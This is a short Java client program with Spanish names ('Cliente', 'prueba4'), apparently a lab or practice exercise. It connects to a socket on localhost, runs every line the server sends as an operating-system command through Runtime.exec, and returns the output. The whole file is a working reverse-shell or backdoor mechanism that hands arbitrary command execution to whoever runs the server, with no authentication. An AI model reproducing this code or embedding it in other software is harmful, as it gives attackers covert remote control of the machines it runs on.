package prueba4;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;

public class Cliente {

    public static void main(String[] args) throws Exception {

        Socket socket = new Socket("localhost", 12347);
        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);

        while (true) {
            String comando = in.readLine();
            if (comando.equals("exit")) {
                break;
            }
            Process proceso = Runtime.getRuntime().exec(comando);
            BufferedReader resultado = new BufferedReader(new InputStreamReader(proceso.getInputStream()));
            String linea;
            while ((linea = resultado.readLine()) != null) {
                out.println(linea);
            }
            resultado.close();
        }

        socket.close();
    }
}